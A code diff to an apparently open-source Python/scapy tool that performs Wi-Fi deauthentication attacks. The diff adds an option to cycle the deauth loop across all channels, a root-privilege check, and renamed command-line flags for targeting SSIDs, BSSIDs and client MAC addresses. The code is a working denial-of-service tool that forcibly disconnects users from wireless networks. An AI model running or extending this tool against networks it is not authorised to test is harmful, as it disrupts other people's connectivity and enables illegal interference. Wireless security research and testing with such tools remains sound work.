@@ -1,10 +1,13 @@
 #!/usr/bin/env python3
 
+import os
 import sys  # leave it
 import signal
 import logging
 import argparse
 import threading  # leave it
+
+from typing import Dict, Generator, List, Union
 
 from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
     Dot11QoS, Dot11Deauth, Dot11
@@ -42,7 +45,7 @@ class Interceptor:
     _SSID_STR_PAD = 42  # total len 80
 
     def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
-                 ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart, debug_mode):
+                 ssid_name, bssid_addr, custom_client_macs, custom_channels, deauth_all_channels, autostart, debug_mode):
         self.interface = net_iface
 
         self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV  # fails to send for 5 consecutive seconds
@@ -77,13 +80,20 @@ class Interceptor:
         self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
         self.log_debug(f"Selected custom bssid addr: {self._custom_ssid_name}")
         self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
-        self.log_debug(f"Selected arget client mac addrs: {self._custom_target_client_mac}")
+        self.log_debug(f"Selected target client mac addrs: {self._custom_target_client_mac}")
         self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
         self.log_debug(f"Selected target client channels: {self._custom_target_client_mac}")
 
         self._custom_target_ap_last_ch = 0  # to avoid overlapping
         self._midrun_output_buffer: List[str] = list()
         self._midrun_output_lck = threading.RLock()
+
+        self._deauth_all_channels = deauth_all_channels
+
+        self._ch_iterator: Union[Generator[int, None, int], None] = None
+        if self._deauth_all_channels:
+            self._ch_iterator = self._init_channels_generator()
+        print_info(f"De-auth all channels enabled -> {BOLD}{self._deauth_all_channels}{RESET}")
 
         self._autostart = autostart
 
@@ -181,6 +191,9 @@ class Interceptor:
                 for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                 if 'Channel' in channel and 'Current' not in channel]
 
+    def _get_channel_range(self) -> List[int]:
+        return self._custom_target_ap_channels or list(self._channel_range.keys())
+
     def _ap_sniff_cb(self, pkt):
         try:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
@@ -204,10 +217,10 @@ class Interceptor:
             pass
 
     def _scan_channels_for_aps(self):
-        channels_to_scan = self._custom_target_ap_channels or self._channel_range
+        channels_to_scan = self._get_channel_range()
         print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
         if self._custom_ssid_name_is_set():
-            print_info(f"Scanning for target SSID -> {self._custom_ssid_name}")
+            print_info(f"Scanning for target SSID -> {BOLD}{self._custom_ssid_name}{RESET}")
         try:
             for idx, ch_num in enumerate(channels_to_scan):
                 if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() \
@@ -215,8 +228,8 @@ class Interceptor:
                     # make sure sniffing doesn't stop on an overlapped channel for custom SSIDs
                     return
                 self._set_channel(ch_num)
-                print_info(f"Scanning channel {self._current_channel_num} (left -> "
-                           f"{len(channels_to_scan) - (idx + 1)})", end="\r")
+                print_info(f"Scanning channel {BOLD}{self._current_channel_num}{RESET}, remaining -> "
+                           f"{len(channels_to_scan) - (idx + 1)} ", end="\r")
                 sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=Interceptor._CH_SNIFF_TO,
                       stop_filter=lambda p: Interceptor._ABORT is True)
         finally:
@@ -330,6 +343,8 @@ class Interceptor:
             ap_mac = self.target_ssid.mac_addr
             while not Interceptor._ABORT:
                 try:
+                    if self._deauth_all_channels:
+                        self._iter_next_channel()
                     self.attack_loop_count += 1
                     for client_mac in self._get_target_clients():
                         self._send_deauth_client(ap_mac, client_mac)
@@ -412,6 +427,17 @@ class Interceptor:
             print_error(msg)
             exit(0)
 
+    def _iter_next_channel(self):
+        self._set_channel(next(self._ch_iterator))
+
+    def _init_channels_generator(self) -> Generator[int, None, int]:
+        ch_range = self._get_channel_range()
+        ctr = 0
+        while not Interceptor._ABORT:
+            yield ch_range[ctr]
+            ctr = (ctr + 1) % len(ch_range)
+        return ctr
+
 
 def main():
     signal.signal(signal.SIGINT, Interceptor.user_abort)
@@ -426,12 +452,14 @@ def main():
     restore_print()
 
     if "linux" not in sys.platform:
-        raise Exception(f"Unsupported operating system {sys.platform}, only linux is supported...")
+        raise OSError(f"Unsupported operating system {sys.platform}, only linux is supported...")
+    elif os.geteuid() != 0:
+        raise PermissionError(f"Must be run as root")
 
     parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
     parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                         action='store', dest="net_iface", metavar="network_interface", required=True)
-    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
+    parser.add_argument('--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                         default=False, dest="skip_monitormode", required=False)
     parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                         action='store_true', default=False, dest="kill_networkmanager", required=False)
@@ -439,15 +467,19 @@ def main():
                         action='store', default=None, dest="custom_ssid", required=False)
     parser.add_argument('-b', '--bssid', help='custom BSSID address (case-insensitive)', metavar="bssid_addr",
                         action='store', default=None, dest="custom_bssid", required=False)
-    parser.add_argument('-cm', '--clients', help='MAC addresses of target clients to disconnect,'
-                                                 ' separated by a comma (i.e -> 00:1A:2B:3C:4D:5G,00:1a:2b:3c:4d:5e)', metavar="client_mac_addrs",
+    parser.add_argument('--clients', help='MAC addresses of target clients to disconnect,'
+                                          ' separated by a comma (i.e -> 00:1A:2B:3C:4D:5G,00:1a:2b:3c:4d:5e)', metavar="client_mac_addrs",
                         action='store', default=None, dest="custom_client_macs", required=False)
-    parser.add_argument('-ch', '--channels', help='custom channels to scan, separated by a comma (i.e -> 1,3,4)',
+    parser.add_argument('-c', '--channels',
+                        help='custom channels to scan / de-auth, separated by a comma (i.e -> 1,3,4)',
                         metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
-    parser.add_argument('-a', '--autostart', help='autostart the de-auth loop (if the scan result contains a single access point)',
+    parser.add_argument('-a', '--autostart',
+                        help='autostart the de-auth loop (if the scan result contains a single access point)',
                         action='store_true', default=False, dest="autostart", required=False)
     parser.add_argument('-d', '--debug', help='enable debug prints',
                         action='store_true', default=False, dest="debug_mode", required=False)
+    parser.add_argument('--deauth-all-channels', help='enable de-auther on all channels',
+                        action='store_true', default=False, dest="deauth_all_channels", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
@@ -458,6 +490,7 @@ def main():
                            bssid_addr=pargs.custom_bssid,
                            custom_client_macs=pargs.custom_client_macs,
                            custom_channels=pargs.custom_channels,
+                           deauth_all_channels=pargs.deauth_all_channels,
                            autostart=pargs.autostart,
                            debug_mode=pargs.debug_mode)
     attacker.run()
